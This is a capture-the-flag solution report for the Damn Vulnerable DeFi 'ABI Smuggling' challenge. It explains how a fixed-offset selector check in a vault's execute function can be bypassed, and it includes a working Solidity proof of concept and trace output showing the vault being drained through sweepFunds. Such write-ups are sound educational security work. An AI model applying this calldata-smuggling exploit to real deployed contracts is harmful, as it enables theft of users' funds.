# Damn Vulnerable DeFi - ABI Smuggling - Solution Report

## Problem Overview

### Contract Summary

The challenge involves two main contracts:

1. `SelfAuthorizedVault`: This contract holds 1 million DVT tokens and implements a permissioned system for withdrawals.

   Key functions:

   - `withdraw`: Allows limited token withdrawals, subject to time constraints.
   - `sweepFunds`: Transfers all tokens to a specified receiver.
   - `_beforeFunctionCall`: An internal function that checks if the target of a call is the vault itself.

2. `AuthorizedExecutor`: An abstract contract that `SelfAuthorizedVault` inherits from, implementing the permission system.

   Key functions:

   - `setPermissions`: Initializes allowed action identifiers.
   - `execute`: Performs permission-checked function calls on a target contract.

### Initial Setup

- The vault is initialized with 1 million DVT tokens.
- The player is granted permission to call a specific function (with selector `0xd9caed12`) on the vault.
- The player starts with 0 DVT tokens.

### Success Criteria

To solve the challenge, the player must:

- Transfer all 1 million DVT tokens from the vault to a designated recovery address.
- Accomplish this using only the permissions granted to the player.

## Vulnerability

The main vulnerability in this challenge lies in the permission checking mechanism implemented in the `AuthorizedExecutor` contract, specifically within the `execute` function. The vulnerable code is as follows:

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    // Read the 4-bytes selector at the beginning of `actionData`
    bytes4 selector;
    uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
    assembly {
        selector := calldataload(calldataOffset)
    }

    if (!permissions[getActionId(selector, msg.sender, target)]) {
        revert NotAllowed();
    }

    _beforeFunctionCall(target, actionData);

    return target.functionCall(actionData);
}
```

The vulnerability stems from two key issues:

1. **Incorrect Selector Extraction**: The function attempts to read the selector from `actionData` at a fixed offset (4 + 32 \* 3 bytes into the calldata). This assumption about the location of the selector within `actionData` is flawed, as it doesn't account for the dynamic nature of calldata encoding.

2. **Disconnect Between Permission Check and Execution**: While the permission check is performed on the selector extracted from a specific location in the calldata, the actual execution (`target.functionCall(actionData)`) uses the entire `actionData`. This disconnect allows an attacker to pass a permitted selector for the check, while executing entirely different function calls.

These issues combined create an "ABI smuggling" vulnerability, where an attacker can craft calldata that passes the permission check but executes arbitrary function calls on the target contract.

## Attack Process

The attack exploits the ABI smuggling vulnerability to bypass the permission system and execute the `sweepFunds` function. The process involves the following steps:

1. **Craft Malicious Calldata**:

   - Construct calldata that starts with the `execute` function selector.
   - Include the vault's address as the target.
   - Set the offset to `actionData` to point past the permission check.
   - Insert the permitted selector (`0xd9caed12`) at the location where the `execute` function will look for it.
   - Append the actual `sweepFunds` function call data.

2. **Bypass Permission Check**:

   - When the `execute` function runs, it reads the selector from the predetermined offset.
   - This selector (`0xd9caed12`) matches the player's permission, allowing the call to proceed.

3. **Execute Unauthorized Function**:

   - After passing the permission check, the `execute` function calls `target.functionCall(actionData)`.
   - This executes the entire `actionData`, which contains the `sweepFunds` call.
   - The `sweepFunds` function is called with the recovery address as the recipient.

4. **Transfer Tokens**:

   - The `sweepFunds` function transfers all tokens from the vault to the recovery address.
   - This succeeds because the call is made from the vault contract itself, satisfying the `onlyThis` modifier.

5. **Complete the Challenge**:
   - All tokens (1 million DVT) are moved from the vault to the recovery address.
   - This satisfies the success criteria of the challenge.

This attack process demonstrates how the vulnerability in the permission checking mechanism can be exploited to execute unauthorized functions, effectively bypassing the intended security measures of the vault.

## Proof of Concept (PoC)

### Core Implementation

The core of the exploit is implemented in the `test_abiSmuggling` function within the challenge's test file. Here's the key code that demonstrates the ABI smuggling attack:

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    // Craft the malicious calldata
    bytes memory maliciousCalldata = abi.encodePacked(
        vault.execute.selector,     // 4 bytes
        abi.encode(address(vault)), // 32 bytes (padded address)
        abi.encode(0x64),           // 32 bytes (offset to actionData, 100 in decimal)
        abi.encode(0x00),           // 32 bytes (padded zero)
        bytes4(0xd9caed12),         // 4 bytes (selector for permission check)
        abi.encode(0x44),           // 32 bytes (length of actionData, 68 in decimal)
        abi.encodeWithSelector(     // Remaining bytes for the actual sweepFunds call
            vault.sweepFunds.selector,
            recovery,
            address(token)
        )
    );

    // Make the call directly from the player's address
    (bool success, ) = address(vault).call(maliciousCalldata);
    require(success, "Exploit failed");
}
```

This PoC demonstrates how an attacker can bypass the permission system and execute the `sweepFunds` function, effectively draining the vault of all its tokens.

### Running Result

```
Ran 1 test for test/abi-smuggling/ABISmuggling.t.sol:ABISmugglingChallenge
[PASS] test_abiSmuggling() (gas: 56985)
Traces:
  [64585] ABISmugglingChallenge::test_abiSmuggling()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [43547] SelfAuthorizedVault::execute(SelfAuthorizedVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 0x85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b)
    │   ├─ [33748] SelfAuthorizedVault::sweepFunds(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b])
    │   │   ├─ [2519] DamnValuableToken::balanceOf(SelfAuthorizedVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   ├─ [27674] DamnValuableToken::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: SelfAuthorizedVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1000000000000000000000000 [1e24])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   └─ ← [Return] 0x
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(SelfAuthorizedVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Vault still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]
```
